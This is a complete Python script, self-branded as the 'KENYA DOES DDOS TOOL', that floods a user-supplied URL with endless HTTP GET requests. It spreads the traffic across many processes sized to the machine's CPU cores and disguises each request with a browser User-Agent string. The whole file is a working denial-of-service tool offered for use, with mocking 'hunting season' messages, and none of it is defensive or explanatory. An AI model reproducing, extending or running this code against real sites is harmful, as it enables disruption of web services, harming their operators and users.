import threading
import requests
import os
import time
import random
from multiprocessing import Process


def get_cpu_cores():
    try:
        return os.cpu_count() or 1
    except:
        return 1


def ddos_target(url, num_threads):
    def attack():
        session = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
        }
        while True:
            try:
                response = session.get(url, headers=headers, timeout=5)  # Timeout after 5 seconds if no response
                if response.status_code == 200:
                    print("[Anarchy]: Request sent successfully")
                else:
                    print("[DDOS]: Connection failed. Status code:", response.status_code)
            except requests.exceptions.RequestException:
                print("[DDOS]: Connection timed out")
            time.sleep(random.uniform(0.1, 1))  # Add a random delay between each request

    processes = []
    for _ in range(num_threads):
        process = Process(target=attack)
        process.daemon = True
        processes.append(process)

    for process in processes:
        process.start()

    for process in processes:
        process.join()


if __name__ == "__main__":
    banner = r'''
        /\_\           /\ \         /\ \     _  /\ \     /\_\       / /\                / /\         /\ \         /\ \     
       / / /  _       /  \ \       /  \ \   /\_\\ \ \   / / /      / /  \              / /  \       /  \ \       /  \ \    
      / / /  /\_\    / /\ \ \     / /\ \ \_/ / / \ \ \_/ / /      / / /\ \            / / /\ \__   / /\ \ \     / /\ \ \   
     / / /__/ / /   / / /\ \_\   / / /\ \___/ /   \ \___/ /      / / /\ \ \          / / /\ \___\ / / /\ \_\   / / /\ \ \  
    / /\_____/ /   / /_/_ \/_/  / / /  \/____/     \ \ \_/      / / /  \ \ \         \ \ \ \/___// /_/_ \/_/  / / /  \ \_\ 
   / /\_______/   / /____/\    / / /    / / /       \ \ \      / / /___/ /\ \         \ \ \     / /____/\    / / /    \/_/ 
  / / /\ \ \     / /\____\/   / / /    / / /         \ \ \    / / /_____/ /\ \    _    \ \ \   / /\____\/   / / /          
 / / /  \ \ \   / / /______  / / /    / / /           \ \ \  / /_________/\ \ \  /_/\__/ / /  / / /______  / / /________   
/ / /    \ \ \ / / /_______\/ / /    / / /             \ \_\/ / /_       __\ \_\ \ \/___/ /  / / /_______\/ / /_________\  
\/_/      \_\_\\/__________/\/_/     \/_/               \/_/\_\___\     /____/_/  \_____\/   \/__________/\/____________/  
                                                                                                                              

'''

    print(banner)
    print("[DDOS]: Welcome to KENYA DOES DDOS TOOL.")
    target_url = input("[DDOS]: Enter the target URL: ")

    num_cores = get_cpu_cores()
    suggested_threads = max(num_cores * 2, 10)
    input_threads = input(f"[DDOS]: Your computer has {num_cores} CPU core(s).\n"
                          f"[DDOS]: For better optimization, we suggest using {suggested_threads} threads.\n"
                          f"[DDOS]: Enter the number of threads (or press Enter to use the suggested value): ")

    num_threads = suggested_threads if not input_threads else int(input_threads)

    if num_threads <= 0:
        print("[DDOS]: Invalid number of threads. Please enter a positive integer Also you can add as many threads as you wish we do not take blame for damaging your pc.")
    else:
        print("[DDOS]: Initiating DDoS attack on", target_url, "with", num_threads, "threads.")
        print("[DDOS]: Press Ctrl+C to stop the attack of we know you want to continue :) .")

        try:
            ddos_target(target_url, num_threads)
        except KeyboardInterrupt:
            print("[DDOS]: DDoS attack stopped hope you had a nice hunting season.")
